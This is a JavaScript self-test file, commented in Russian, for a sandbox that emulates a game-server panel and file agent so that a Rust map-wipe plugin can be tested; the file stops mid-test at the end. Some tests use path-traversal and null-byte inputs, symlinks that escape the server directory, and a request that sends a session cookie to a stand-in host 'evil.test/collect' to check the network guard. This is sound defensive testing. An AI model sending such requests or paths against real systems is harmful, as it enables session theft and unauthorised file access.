/**
 * Самопроверка песочницы tools/review/sandbox.mjs на настоящем коде плагина.
 * Запуск: node tools/review/sandbox.selftest.mjs
 *        (или node tools/review/run.mjs --selftest --only selftest)
 *
 * Что показывает:
 *   - дерево, ответы агента (list, delete), ошибки отсутствующего пути и
 *     поведение ссылок — как в исходниках агента Catalyst v1.89.2;
 *   - проверочный прогон (dry-run) ничего не удаляет;
 *   - боевой вайп идёт «остановка → удаление → запуск», diff дерева — ожидаемый;
 *   - каждый режим сбоя туннеля и панели срабатывает;
 *   - проверка доступа во всех режимах;
 *   - часы переводятся, ожидания 300 с проходят мгновенно;
 *   - сбой записи в коллекцию внедряется;
 *   - зависание ловится как «тест не завершился», а не как тихий успех.
 *
 * Здесь проверяется сама песочница. Решения плагина (ok прогона и т. п.)
 * утверждаются только там, где правильный ответ не зависит от будущих
 * исправлений; в остальных местах они печатаются заметкой «плагин: …».
 */

import assert from 'node:assert/strict';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  createClock,
  createJournal,
  createPanel,
  createSandbox,
  createTree,
  createTunnel,
  diff,
  loadPlugin,
  makeContext,
  realFetch,
  runNode,
  runWithTz,
  rustServerTree,
  test,
  withTempDir,
} from './sandbox.mjs';

const SANDBOX_URL = new URL('./sandbox.mjs', import.meta.url).href;
const RUN_MJS = fileURLToPath(new URL('./run.mjs', import.meta.url));
const CHILD_PRELUDE = `import assert from 'node:assert/strict';\nimport { createSandbox, test } from ${JSON.stringify(SANDBOX_URL)};\n`;

const MAP = '/server/rust/proceduralmap.3000.12345.270.map';
const SAV = '/server/rust/proceduralmap.3000.12345.270.sav';
const BLUEPRINTS = '/server/rust/player.blueprints.270.db';

const powerCalls = (sb) =>
  sb.panel.calls.filter((call) => call.method === 'POST' && /\/(stop|start|restart|kill)$/.test(call.path)).map((call) => call.path);

const seqs = (sb, predicate) => sb.journal.entries.filter(predicate).map((entry) => entry.seq);

// ── Дерево ──────────────────────────────────────────────────────────────────

test('дерево: снимок, имена с «..», «*», «?», регистр, ссылки, junction и diff', () => {
  const tree = createTree(rustServerTree());
  const snap = tree.snapshot();
  for (const item of [
    '/',
    '/oxide/data/evil..json',
    '/oxide/data/..hidden',
    '/oxide/data/star*.json',
    '/oxide/data/what?.json',
    '/oxide/data/Kits.json',
    '/oxide/data/kits.json',
    '/server/rust/Player.Blueprints.270.DB',
    '/oxide/data/backup -> /srv/backup',
    '/oxide/data/up -> ../../../other-server',
    '/oxide/data/shared => host:/srv/shared',
    'host:/srv/backup/world.sav',
    'host:/var/lib/catalyst/other-server/server/rust/sv.files.270.db',
  ]) {
    assert.ok(snap.includes(item), `в снимке нет ${item}`);
  }
  tree.remove('/oxide/data/kits.json').add('/oxide/data/new.json', '{}');
  const change = tree.diff(snap);
  assert.deepEqual(change.removed, ['/oxide/data/kits.json']);
  assert.deepEqual(change.added, ['/oxide/data/new.json']);
  assert.equal(change.kept.length, snap.length - 1);
  assert.deepEqual(diff(['a', 'b'], ['b', 'c']), { removed: ['a'], added: ['c'], kept: ['b'] });
});

// ── Туннель и агент ─────────────────────────────────────────────────────────

test('туннель: ответ list как у агента — поля, порядок, ссылки и junction', async () => {
  const tree = createTree(rustServerTree());
  const tunnel = createTunnel({ tree });
  const res = await tunnel.queueRequest('node1', 'list', tree.uuid, '/oxide/data');
  assert.equal(res.success, true);
  assert.deepEqual(
    res.data.map((entry) => entry.name),
    ['backup', 'Kits', 'shared', 'up', '..hidden', 'cfg-link.json', 'evil..json', 'Kits.json', 'kits.json', 'star*.json', 'what?.json'],
  );
  const byName = Object.fromEntries(res.data.map((entry) => [entry.name, entry]));
  assert.deepEqual(byName.backup, { name: 'backup', size: 0, isDirectory: true, type: 'directory', modified: '2026-11-01T00:00:00+00:00', mode: 0o777 });
  assert.deepEqual(byName['cfg-link.json'], { name: 'cfg-link.json', size: 32, isDirectory: false, type: 'file', modified: '2026-11-01T00:00:00+00:00', mode: 0o777 });
  assert.deepEqual(byName.shared, { name: 'shared', size: 0, isDirectory: true, type: 'directory', modified: '2026-11-01T00:00:00+00:00', mode: 0o755 });
  assert.deepEqual(byName['Kits.json'], { name: 'Kits.json', size: 11, isDirectory: false, type: 'file', modified: '2026-11-01T00:00:00+00:00', mode: 0o644 });
  assert.equal(res.error, undefined);
  assert.ok('requestId' in res && 'contentType' in res);
});

test('туннель: отсутствующий путь и плохой путь — те же тексты ошибок, что у агента', async () => {
  const tree = createTree(rustServerTree());
  const tunnel = createTunnel({ tree });
  const call = (op, target, uuid = tree.uuid) => tunnel.queueRequest('node1', op, uuid, target);
  assert.equal((await call('list', '/nope')).error, 'File system error: Failed to read dir /nope: No such file or directory (os error 2)');
  assert.equal((await call('list', '/nope/deeper')).error, `File system error: Cannot access path: ${tree.root}/nope`);
  assert.equal((await call('delete', '/nope')).error, 'IO error: No such file or directory (os error 2)');
  assert.equal((await call('list', '/start.sh')).error, 'File system error: Failed to read dir /start.sh: Not a directory (os error 20)');
  assert.equal((await call('delete', '/start.sh/x')).error, 'File system error: Cannot access path: Not a directory (os error 20)');
  assert.equal((await call('list', '/../../etc')).error, 'File system error: Failed to read dir /etc: No such file or directory (os error 2)');
  const normalized = await call('list', '/server/../oxide');
  assert.equal(normalized.success, true);
  assert.equal(tunnel.calls.at(-1).path, '/oxide');
  assert.equal(tunnel.calls.at(-1).rawPath, '/server/../oxide');
  await assert.rejects(call('list', '/a\0b'), /Invalid path/);
  assert.equal((await call('list', '/', '../x')).error, 'Invalid request: Invalid server id');
  assert.equal((await call('list', '/', '')).error, 'Invalid request: Invalid server id');
  assert.equal((await call('rename', '/start.sh')).error, 'песочница: операция агента «rename» не эмулируется');
  assert.equal((await call('frobnicate', '/')).error, 'Unknown operation: frobnicate');
});

test('туннель: неизвестный сервер на ноде и неподключённая нода', async () => {
  const clock = createClock().install();
  const tree = createTree(rustServerTree());
  const tunnel = createTunnel({ tree });
  const root = await tunnel.queueRequest('node1', 'list', 'ghost-uuid', '/');
  assert.deepEqual([root.success, root.data], [true, []]);
  assert.equal(tree.hostExists(`${tree.dataDir}/ghost-uuid`), true, 'агент создаёт корень сервера при листинге «/»');
  const deeper = await tunnel.queueRequest('node1', 'list', 'ghost-2', '/server');
  assert.equal(deeper.error, 'File system error: Failed to read dir /server: No such file or directory (os error 2)');
  const started = clock.now();
  await assert.rejects(clock.runUntil(tunnel.queueRequest('node-x', 'list', tree.uuid, '/')), /Agent file operation timed out/);
  assert.equal(clock.now() - started, 60000);
});

test('туннель: ссылки как у агента (режим agent)', async () => {
  const tree = createTree(rustServerTree({ withDataLink: true }));
  const tunnel = createTunnel({ tree });
  const call = (op, target) => tunnel.queueRequest('node1', op, tree.uuid, target);
  const before = tree.snapshot();

  const outside = await call('delete', '/oxide/data/backup');
  assert.equal(
    outside.error,
    `Permission denied: Access denied: symbolic link leaves the server directory: ${tree.root}/oxide/data/backup`,
  );
  assert.equal((await call('list', '/oxide/data/up')).error, 'Permission denied: Access denied: path outside data directory');
  assert.deepEqual(tree.diff(before).removed, [], 'наружу ничего не стёрто');

  // Ссылка на файл внутри сервера: агент удаляет цель, сама ссылка остаётся.
  assert.equal((await call('delete', '/oxide/data/cfg-link.json')).success, true);
  assert.deepEqual(tree.diff(before).removed, ['/server/rust/cfg/server.cfg']);
  assert.ok(tree.snapshot().includes('/oxide/data/cfg-link.json -> ../../server/rust/cfg/server.cfg'));

  // junction агент считает каталогом: стирает содержимое цели и получает EBUSY.
  const junction = await call('delete', '/oxide/data/shared');
  assert.equal(junction.error, 'File system error: Failed to delete: Device or resource busy (os error 16)');
  assert.deepEqual(tree.diff(before).removed, ['/server/rust/cfg/server.cfg', 'host:/srv/shared/global.json']);

  // '/data/…' агент переносит внутрь сервера: листинг показывает файл, удаление стирает каталог.
  const listing = await call('list', '/oxide/data');
  const maps = listing.data.find((entry) => entry.name === 'maps');
  assert.deepEqual([maps.isDirectory, maps.size], [false, '/data/server/rust'.length]);
  assert.equal((await call('delete', '/oxide/data/maps')).success, true);
  const removed = tree.diff(before).removed;
  assert.ok(removed.includes('/server/rust/') && removed.includes(MAP), 'каталог /server/rust стёрт целиком');
  assert.ok(tree.exists('/server'));
});

test('туннель: режимы ссылок follow и nofollow для сравнения', async () => {
  const followTree = createTree(rustServerTree());
  const follow = createTunnel({ tree: followTree, links: 'follow' });
  const followBefore = followTree.snapshot();
  assert.equal((await follow.queueRequest('node1', 'delete', followTree.uuid, '/oxide/data/backup')).success, true);
  assert.deepEqual(followTree.diff(followBefore).removed, ['host:/srv/backup/', 'host:/srv/backup/notes.txt', 'host:/srv/backup/world.sav']);

  const tree = createTree(rustServerTree());
  const tunnel = createTunnel({ tree });
  tunnel.setLinks('nofollow');
  const call = (op, target) => tunnel.queueRequest('node1', op, tree.uuid, target);
  const listing = await call('list', '/oxide/data');
  const kinds = Object.fromEntries(listing.data.map((entry) => [entry.name, entry.isDirectory]));
  assert.deepEqual([kinds.backup, kinds.shared, kinds.Kits], [false, false, true]);
  assert.equal((await call('list', '/oxide/data/backup')).error, 'File system error: Failed to read dir /oxide/data/backup: Not a directory (os error 20)');
  assert.equal(
    (await call('list', '/oxide/data/shared/x')).error,
    'File system error: Cannot access path: Too many levels of symbolic links (os error 40)',
  );
  const before = tree.snapshot();
  assert.equal((await call('delete', '/oxide/data/backup')).success, true);
  assert.deepEqual(tree.diff(before).removed, ['/oxide/data/backup -> /srv/backup']);
  assert.equal(tunnel.links, 'nofollow');
});

test('туннель: сбой, «Server not found», задержка, исключение, зависание; журнал вызовов', async () => {
  const clock = createClock().install();
  const tree = createTree(rustServerTree());
  const journal = createJournal();
  const tunnel = createTunnel({ tree, journal });
  const call = (op, target) => tunnel.queueRequest('node1', op, tree.uuid, target);

  tunnel.fail({ op: 'delete', path: '/start.sh', error: 'Permission denied (os error 13)', times: 1 });
  const denied = await call('delete', '/start.sh');
  assert.deepEqual([denied.success, denied.error], [false, 'Permission denied (os error 13)']);
  assert.ok(tree.exists('/start.sh'));
  assert.equal((await call('delete', '/start.sh')).success, true, 'times: 1 — второй раз обычный ответ');
  assert.equal(tree.exists('/start.sh'), false);

  const off = tunnel.serverNotFound({ op: ['delete'] });
  assert.equal((await call('delete', '/runds.sh')).error, 'Server not found');
  assert.equal((await call('list', '/')).success, true, 'list не затронут');
  off();
  tunnel.serverNotFound();
  assert.equal((await call('list', '/')).error, 'Server not found');
  tunnel.clear();

  tunnel.delay(5000, { op: 'list', path: /^\/oxide/ });
  let mark = clock.now();
  assert.equal((await clock.runUntil(call('list', '/oxide'))).success, true);
  assert.equal(clock.now() - mark, 5000);
  tunnel.clear();

  tunnel.throws({ op: 'list', error: 'Too many pending requests for node node1' });
  await assert.rejects(call('list', '/'), /Too many pending requests/);
  tunnel.clear();

  tunnel.hang({ op: 'list', path: '/server', panelTimeout: true });
  mark = clock.now();
  await assert.rejects(clock.runUntil(call('list', '/server')), /Agent file operation timed out/);
  assert.equal(clock.now() - mark, 60000);
  tunnel.clear();

  tunnel.hang({ op: 'list', path: '/oxide' });
  void call('list', '/oxide');
  await clock.settle();
  assert.equal(tunnel.pending().length, 1);
  assert.match(tunnel.describe()[0], /туннель: без ответа list \/oxide/);

  const lines = tunnel.calls.map((entry) => `${entry.op} ${entry.path} ${entry.outcome}`);
  assert.deepEqual(lines.slice(0, 3), ['delete /start.sh error', 'delete /start.sh ok', 'delete /runds.sh error']);
  assert.ok(tunnel.calls.every((entry, index, all) => index === 0 || all[index - 1].seq < entry.seq));
  assert.deepEqual(tunnel.paths('delete'), ['/start.sh', '/start.sh', '/runds.sh']);
  assert.ok(journal.lines(['tunnel']).every((line) => line.includes('tunnel ')));
});

// ── Плагин целиком ──────────────────────────────────────────────────────────

test('плагин: проверочный прогон (dry-run) ничего не удаляет и не трогает питание', async (t) => {
  const sb = createSandbox();
  await sb.load();
  const before = sb.tree.snapshot();
  const profile = await sb.addProfile({ options: { dryRun: true } });
  const run = await sb.wipe(profile);
  assert.equal(run.dryRun, true);
  assert.deepEqual(sb.tree.snapshot(), before);
  assert.deepEqual(sb.tunnel.paths('delete'), []);
  assert.deepEqual(powerCalls(sb), []);
  assert.equal(sb.status(), 'running');
  assert.equal(sb.runs().length, 1);
  t.note(`плагин: по плану было бы удалено ${run.deleted.join(', ')}`);

  // То же через роут «Запустить проверку» — прогон идёт в фоне, until дожидается записи.
  const res = await sb.call('owner', 'POST', `/servers/srv1/profiles/${profile.id}/run`, { body: { dryRun: true } });
  if (res.status === 200) {
    await sb.until(() => sb.runs().length === 2);
    assert.deepEqual(sb.tree.snapshot(), before);
    assert.deepEqual(sb.tunnel.paths('delete'), []);
    assert.deepEqual(powerCalls(sb), []);
  } else {
    t.note(`плагин: роут запуска ответил ${res.status} ${JSON.stringify(res.body)}`);
  }
});

test('плагин: боевой вайп идёт «остановка → удаление → запуск», diff дерева ожидаемый', async (t) => {
  const sb = createSandbox();
  await sb.load();
  const before = sb.tree.snapshot();
  const profile = await sb.addProfile({
    targets: ['/server/*/proceduralmap.*.map', '/server/*/proceduralmap.*.sav', '/server/*/player.blueprints.*.db'],
  });
  const run = await sb.wipe(profile);
  assert.equal(run.ok, true, JSON.stringify(run.errors));
  const change = sb.tree.diff(before);
  assert.deepEqual(change.removed, [BLUEPRINTS, MAP, SAV]);
  assert.deepEqual(change.added, []);

  const stop = seqs(sb, (entry) => entry.kind === 'fetch' && entry.method === 'POST' && entry.path === '/api/servers/srv1/stop');
  const stopped = seqs(sb, (entry) => entry.kind === 'server' && entry.to === 'stopped');
  const deletes = seqs(sb, (entry) => entry.kind === 'tunnel' && entry.op === 'delete');
  const start = seqs(sb, (entry) => entry.kind === 'fetch' && entry.method === 'POST' && entry.path === '/api/servers/srv1/start');
  assert.deepEqual([stop.length, stopped.length, deletes.length, start.length], [1, 1, 3, 1]);
  assert.ok(stop[0] < stopped[0] && stopped[0] < Math.min(...deletes) && Math.max(...deletes) < start[0], 'порядок нарушен');
  await sb.idle();
  assert.equal(sb.status(), 'running');
  assert.deepEqual(
    sb.panel.history('srv1').map((item) => `${item.from}→${item.to}`),
    ['running→stopping', 'stopping→stopped', 'stopped→starting', 'starting→running'],
  );
  t.note(sb.journal.lines(['fetch', 'server', 'tunnel']).filter((line) => / POST | delete | server /.test(line)).join('\n        '));
});

test('плагин: зависший туннель ловится как «тест не завершился», а не тихий успех', async () => {
  const code = `${CHILD_PRELUDE}
test('вайп с зависшим удалением', async () => {
  const sb = createSandbox();
  await sb.load();
  sb.tunnel.hang({ op: 'delete' });
  const profile = await sb.addProfile();
  await sb.wipe(profile);
});
test('следующий тест идёт дальше', () => {});
`;
  const result = await runNode({ code, timeoutMs: 60000 });
  assert.equal(result.code, 1, result.stdout + result.stderr);
  assert.match(result.stdout, /FAIL {2}вайп с зависшим удалением/);
  assert.match(result.stdout, /тест не завершился/);
  assert.match(result.stdout, /туннель: без ответа delete \/server\/rust\/proceduralmap/);
  assert.match(result.stdout, /PASS {2}следующий тест идёт дальше/);
  assert.match(result.stdout, /Итог: 1 PASS, 1 FAIL/);
}, { timeoutMs: 60000 });

test('плагин: зависший туннель с таймаутом панели — запросы снимаются через 60 с виртуально', async (t) => {
  const sb = createSandbox();
  await sb.load();
  sb.tunnel.hang({ op: 'delete', panelTimeout: true });
  const before = sb.tree.snapshot();
  const profile = await sb.addProfile();
  const started = sb.clock.now();
  const realStarted = performance.now();
  const run = await sb.wipe(profile);
  const deletes = sb.tunnel.calls.filter((entry) => entry.op === 'delete');
  assert.ok(deletes.length >= 1);
  assert.ok(deletes.every((entry) => entry.outcome === 'throw' && entry.error === 'Agent file operation timed out'));
  assert.ok(sb.clock.now() - started >= 60000 * deletes.length);
  assert.ok(performance.now() - realStarted < 5000);
  assert.deepEqual(sb.tree.snapshot(), before);
  t.note(`плагин: ok=${run.ok}, ошибки: ${run.errors.join(' | ')}`);
});

test('плагин: «Server not found» на удалении — режим срабатывает, файлы целы', async (t) => {
  const sb = createSandbox();
  await sb.load();
  sb.tunnel.serverNotFound({ op: 'delete' });
  const before = sb.tree.snapshot();
  const profile = await sb.addProfile();
  const run = await sb.wipe(profile);
  const deletes = sb.tunnel.calls.filter((entry) => entry.op === 'delete');
  assert.ok(deletes.length >= 1);
  assert.ok(deletes.every((entry) => entry.outcome === 'error' && entry.error === 'Server not found'));
  assert.ok(sb.tunnel.calls.some((entry) => entry.op === 'list' && entry.outcome === 'ok'), 'list работает как обычно');
  assert.deepEqual(sb.tree.snapshot(), before);
  t.note(`плагин: ok=${run.ok}, удалено ${run.deletedCount}, пропущено ${run.skipped.length}, ошибок ${run.errors.length}`);
});

// ── Панель ──────────────────────────────────────────────────────────────────

test('панель: сервер не останавливается — POST /stop без ack 60 с, статус stopping навсегда', async () => {
  const sb = createSandbox();
  sb.panel.behave('srv1', { stop: 'never' });
  const started = sb.clock.now();
  const res = await sb.run(
    fetch(`${sb.panel.base}/api/servers/srv1/stop`, { method: 'POST', headers: { authorization: `Bearer ${sb.panel.apiKey}` } }),
  );
  assert.equal(res.status, 202);
  assert.equal((await res.json()).timedOutWaitingForAck, true);
  assert.equal(sb.clock.now() - started, 60000);
  await sb.clock.advance(3600000);
  assert.equal(sb.status(), 'stopping');
});

test('плагин: сервер не останавливается — ничего не удалено', async (t) => {
  const sb = createSandbox();
  await sb.load();
  sb.panel.behave('srv1', { stop: 'never' });
  const before = sb.tree.snapshot();
  const profile = await sb.addProfile();
  const run = await sb.wipe(profile);
  assert.deepEqual(sb.tunnel.paths('delete'), []);
  assert.deepEqual(sb.tree.snapshot(), before);
  const stop = sb.panel.calls.find((call) => call.path === '/api/servers/srv1/stop');
  t.note(`плагин: POST /stop → ${stop.status ?? stop.outcome}; ok=${run.ok}; ${run.errors.join(' | ')}`);
});

test('плагин: не останавливается, панель отвечает сразу — ожидание 300 с проходит мгновенно', async (t) => {
  const sb = createSandbox();
  await sb.load();
  sb.panel.behave('srv1', { stop: 'never', stopAckMs: 0 });
  const profile = await sb.addProfile();
  const virtualStart = sb.clock.now();
  const realStart = performance.now();
  const run = await sb.wipe(profile);
  const virtual = sb.clock.now() - virtualStart;
  const real = performance.now() - realStart;
  assert.ok(virtual >= 300000, `виртуально прошло ${virtual} мс`);
  assert.ok(real < 5000, `по-настоящему прошло ${Math.round(real)} мс`);
  assert.deepEqual(sb.tunnel.paths('delete'), []);
  const reads = sb.journal.of('db').filter((entry) => entry.table === 'servers').length;
  t.note(`плагин: ждал ${Math.round(virtual / 1000)} с виртуально за ${Math.round(real)} мс, статус читал ${reads} раз; ok=${run.ok}`);
});

test('панель: crashed, не запускается, падает при запуске, долго в starting, застрял, нода offline', async () => {
  const sb = createSandbox();
  const post = async (action) => {
    const res = await sb.run(
      fetch(`${sb.panel.base}/api/servers/srv1/${action}`, { method: 'POST', headers: { authorization: `Bearer ${sb.panel.apiKey}` } }),
    );
    return { status: res.status, body: await res.json() };
  };
  sb.panel.crash('srv1');
  assert.equal(sb.status(), 'crashed');
  let res = await post('stop');
  assert.deepEqual([res.status, res.body.message, sb.status()], [200, 'Server marked as stopped', 'stopped']);

  sb.panel.behave('srv1', { start: 'never', startMs: 4000 });
  res = await post('start');
  assert.deepEqual([res.status, sb.status()], [200, 'starting']);
  await sb.clock.advance(4000);
  assert.equal(sb.status(), 'stopped');

  sb.panel.behave('srv1', { start: 'crash' });
  await post('start');
  await sb.clock.advance(4000);
  assert.equal(sb.status(), 'crashed');

  sb.panel.setStatus('srv1', 'stopped');
  sb.panel.behave('srv1', { start: 'slow', startingMs: 600000 });
  await post('start');
  await sb.clock.advance(599000);
  assert.equal(sb.status(), 'starting');
  await sb.clock.advance(1000);
  assert.equal(sb.status(), 'running');
  res = await post('start');
  assert.equal(res.status, 409);
  assert.match(res.body.error, /Cannot start server in running state/);

  sb.panel.setStatus('srv1', 'stopped');
  sb.panel.behave('srv1', { start: 'stuck' });
  await post('start');
  await sb.clock.advance(24 * 3600000);
  assert.equal(sb.status(), 'starting');

  const transitions = sb.panel.history('srv1').map((item) => `${item.from}→${item.to}`);
  assert.ok(transitions.includes('starting→stopped') && transitions.includes('starting→crashed'));

  sb.panel.setStatus('srv1', 'stopped');
  sb.panel.setNodeOnline('srv1', false);
  res = await post('start');
  assert.deepEqual([res.status, res.body.error], [503, 'Node is offline']);
});

test('панель: приостановка — suspendedAt и статус в ctx.db.servers, 423 у REST, 403 у роутов', async () => {
  const sb = createSandbox();
  await sb.load();
  sb.panel.suspend('srv1', { reason: 'долг' });
  const row = await sb.run(sb.ctx.db.servers.findUnique({ where: { id: 'srv1' } }));
  assert.ok(row.suspendedAt instanceof Date);
  assert.deepEqual([row.status, row.suspensionReason], ['suspended', 'долг']);
  assert.equal(row.template, undefined, 'ctx.db.servers отдаёт только разрешённые поля');
  const res = await sb.run(
    fetch(`${sb.panel.base}/api/servers/srv1/stop`, { method: 'POST', headers: { authorization: `Bearer ${sb.panel.apiKey}` } }),
  );
  assert.equal(res.status, 423);
  assert.equal((await res.json()).code, 'SERVER_SUSPENDED');
  const route = await sb.call('owner', 'GET', '/servers/srv1/status');
  assert.equal(route.status, 403);
  assert.match(route.body.error, /приостановлен/);

  sb.panel.unsuspend('srv1');
  sb.panel.suspend('srv1', { status: 'stopped' });
  const overwritten = await sb.run(sb.ctx.db.servers.findUnique({ where: { id: 'srv1' } }));
  assert.ok(overwritten.suspendedAt instanceof Date);
  assert.equal(overwritten.status, 'stopped', 'статус и suspendedAt задаются отдельно');
});

test('панель: команды консоли записываются со статусом сервера на момент команды', async (t) => {
  const sb = createSandbox();
  await sb.load();
  const command = (text, extra = {}) =>
    sb.run(
      fetch(`${sb.panel.base}/api/servers/srv1/console/command`, {
        method: 'POST',
        headers: { authorization: `Bearer ${sb.panel.apiKey}`, 'content-type': 'application/json' },
        body: JSON.stringify({ command: text }),
        ...extra,
      }),
    );
  assert.equal((await command('say привет')).status, 202);
  sb.panel.setStatus('srv1', 'starting');
  await command('oxide.reload *');
  assert.deepEqual(
    sb.panel.console('srv1').map((item) => [item.command, item.status]),
    [['say привет', 'running'], ['oxide.reload *', 'starting']],
  );
  assert.equal((await command('   ')).status, 400);
  const empty = await sb.run(
    fetch(`${sb.panel.base}/api/servers/srv1/console/command`, {
      method: 'POST',
      headers: { authorization: `Bearer ${sb.panel.apiKey}`, 'content-type': 'application/json' },
    }),
  );
  assert.equal((await empty.json()).code, 'FST_ERR_CTP_EMPTY_JSON_BODY');

  sb.panel.setStatus('srv1', 'running');
  const profile = await sb.addProfile({ options: { commandsAfter: ['say вайп завершён'] } });
  await sb.wipe(profile);
  await sb.idle();
  const sent = sb.panel.console('srv1').filter((item) => item.command === 'say вайп завершён');
  assert.equal(sent.length, 1);
  t.note(`плагин: команда после запуска ушла при статусе ${sent[0].status}`);
});

test('панель: переменные шаблона — GET, PATCH с проверкой правил, 422', async () => {
  const sb = createSandbox();
  const headers = { authorization: `Bearer ${sb.panel.apiKey}`, 'content-type': 'application/json' };
  const url = `${sb.panel.base}/api/servers/srv1/variables`;
  const list = await (await sb.run(fetch(url, { headers: { authorization: headers.authorization } }))).json();
  assert.deepEqual(list.data.map((item) => item.name), ['SERVER_HOSTNAME', 'WORLD_SEED', 'WORLD_SIZE', 'MAX_PLAYERS', 'RCON_PASS']);
  const bad = await sb.run(fetch(url, { method: 'PATCH', headers, body: JSON.stringify({ WORLD_SEED: '0' }) }));
  assert.equal(bad.status, 422);
  const fields = (await bad.json()).fields;
  assert.equal(fields.WORLD_SEED, 'Must be between 1 and 2147483647');
  assert.equal(fields.SERVER_HOSTNAME, 'This field is required');
  const values = Object.fromEntries(list.data.map((item) => [item.name, item.value]));
  const ok = await sb.run(fetch(url, { method: 'PATCH', headers, body: JSON.stringify({ ...values, WORLD_SEED: '777' }) }));
  assert.equal(ok.status, 200);
  assert.equal(sb.panel.server('srv1').environment.WORLD_SEED, '777');
});

test('проверка доступа: panel, ok, forbidden, login-200, redirect-302 (тот же и другой origin)', async (t) => {
  // Режимы ответа панели на GET /api/servers/:id проверяются прямыми запросами в подмену.
  // Плагин после ревью доступ субпользователя по его cookie не проверяет: он читает
  // список доступа сервера своим ключом (см. tools/review/fix-f2a-access.test.mjs).
  const sb = createSandbox();
  await sb.load();
  const sub = { cookie: 'better-auth.session_token=sess_sub' };
  const stranger = { cookie: 'better-auth.session_token=sess_stranger' };
  const get = (headers) => sb.run(fetch('https://panel.test/api/servers/srv1', { headers }));
  const checks = () => sb.panel.calls.filter((call) => call.method === 'GET' && call.path === '/api/servers/srv1');

  let res = await get(sub);
  let last = checks().at(-1);
  assert.equal(res.status, 200);
  assert.deepEqual([last.status, last.cookie, last.origin], [200, true, 'https://panel.test']);
  res = await get(stranger);
  assert.deepEqual([res.status, checks().at(-1).status], [403, 403]);

  sb.panel.setAccess('ok');
  res = await get(stranger);
  assert.deepEqual([checks().at(-1).status, res.status], [200, 200]);

  sb.panel.setAccess('forbidden');
  res = await get(sub);
  assert.deepEqual([checks().at(-1).status, res.status], [403, 403]);

  sb.panel.setAccess('login-200');
  res = await get(stranger);
  last = checks().at(-1);
  assert.equal(last.status, 200);
  assert.match(last.contentType, /text\/html/);

  sb.panel.setAccess('redirect-302');
  res = await get(stranger);
  let [hop0, hop1] = sb.panel.calls.slice(-2);
  assert.deepEqual([hop0.status, hop0.location], [302, 'https://panel.test/login?next=%2Fapi%2Fservers%2Fsrv1']);
  assert.deepEqual([hop1.path, hop1.status, hop1.cookie, hop1.redirectedFrom], ['/login', 200, true, hop0.url]);

  sb.panel.addOrigin('https://sso.test');
  sb.panel.setAccess('redirect-302', { loginOrigin: 'https://sso.test' });
  res = await get({ ...stranger, authorization: 'Bearer user-token' });
  [hop0, hop1] = sb.panel.calls.slice(-2);
  assert.deepEqual([hop0.cookie, hop0.authorization], [true, true]);
  assert.deepEqual([hop1.origin, hop1.cookie, hop1.authorization, hop1.status], ['https://sso.test', false, false, 200]);
  t.note('redirect-302 на другой origin: cookie и authorization на втором шаге отброшены, как в fetch Node');
});

test('панель: внутренний адрес, чужой хост, порт без сервера, сторож сети после restore()', async () => {
  const sb = createSandbox();
  const auth = { authorization: `Bearer ${sb.panel.apiKey}` };
  const inner = await sb.run(fetch('http://127.0.0.1:3000/api/servers', { headers: auth }));
  assert.equal(inner.status, 200);
  assert.equal((await inner.json()).data[0].id, 'srv1');

  await assert.rejects(
    sb.run(fetch('https://evil.test/collect', { headers: { cookie: 'better-auth.session_token=sess_sub' } })),
    (error) => error.cause?.code === 'ENOTFOUND',
  );
  const leaked = sb.panel.calls.at(-1);
  assert.deepEqual([leaked.origin, leaked.cookie, leaked.outcome], ['https://evil.test', true, 'error']);

  let seen = null;
  sb.panel.host('https://evil.test', (request) => {
    seen = request;
    return { status: 200, headers: { 'content-type': 'text/plain' }, body: 'принято' };
  });
  const evil = await sb.run(fetch('https://evil.test/collect', { headers: { cookie: 'a=b' } }));
  assert.equal(await evil.text(), 'принято');
  assert.equal(seen.headers.cookie, 'a=b');

  await assert.rejects(sb.run(fetch('http://127.0.0.1:4999/x')), (error) => error.cause?.code === 'ECONNREFUSED');

  const fake = globalThis.fetch;
  sb.panel.restore();
  assert.notEqual(globalThis.fetch, fake);
  await assert.rejects(fetch('https://panel.test/api/servers'), (error) => /настоящая сеть закрыта/.test(error.cause?.message));
  assert.equal(typeof realFetch, 'function');
  assert.notEqual(realFetch, globalThis.fetch);
});

// ── Часы ────────────────────────────────────────────────────────────────────

test('часы: поддельные Date и таймеры, AbortSignal.timeout, перевод, until и восстановление', async () => {
  const originalDate = Date;
  const originalSetTimeout = setTimeout;
  const originalAbortTimeout = AbortSignal.timeout;
  const clock = createClock({ now: '2026-03-29T00:30:00Z' }).install();
  assert.equal(Date.now(), Date.parse('2026-03-29T00:30:00Z'));
  assert.equal(new Date().toISOString(), '2026-03-29T00:30:00.000Z');
  assert.equal(new Date(2020, 0, 1).getFullYear(), 2020, 'конструктор с аргументами — настоящий');
  assert.ok(new Date() instanceof originalDate);
  assert.equal(typeof Date(), 'string');

  const fired = [];
  setTimeout(() => fired.push('a'), 1000);
  setTimeout(() => fired.push('b'), 500);
  const interval = setInterval(() => fired.push('i'), 400);
  await clock.advance(1000);
  clearInterval(interval);
  assert.deepEqual(fired, ['i', 'b', 'i', 'a']);
  assert.equal(new Date().toISOString(), '2026-03-29T00:30:01.000Z');

  const signal = AbortSignal.timeout(5000);
  await clock.advance(4999);
  assert.equal(signal.aborted, false);
  await clock.advance(1);
  assert.deepEqual([signal.aborted, signal.reason.name], [true, 'TimeoutError']);

  const virtualStart = clock.now();
  const realStart = performance.now();
  const value = await clock.runUntil(
    (async () => {
      for (let index = 0; index < 150; index += 1) await new Promise((resolve) => setTimeout(resolve, 2000));
      return 'дождались';
    })(),
  );
  assert.equal(value, 'дождались');
  assert.equal(clock.now() - virtualStart, 300000);
  assert.ok(performance.now() - realStart < 3000);

  let flag = false;
  setTimeout(() => {
    flag = true;
  }, 7000);
  const later = setTimeout(() => {}, 9000);
  const beforeUntil = clock.now();
  await clock.until(() => flag);
  assert.equal(clock.now() - beforeUntil, 7000, 'until не крутит лишний таймер после выполнения условия');
  clearTimeout(later);
  await assert.rejects(clock.runUntil(() => {
    throw new Error('синхронная ошибка');
  }), /синхронная ошибка/);

  clock.setNow('2026-10-25T00:59:00Z');
  assert.equal(new Date().toISOString(), '2026-10-25T00:59:00.000Z');
  await assert.rejects(
    clock.runUntil(new Promise((resolve) => setTimeout(resolve, 10 * 24 * 3600000)), { maxVirtualMs: 3600000 }),
    /виртуального времени ожидание не закончилось/,
  );

  clock.restore();
  assert.equal(Date, originalDate);
  assert.equal(setTimeout, originalSetTimeout);
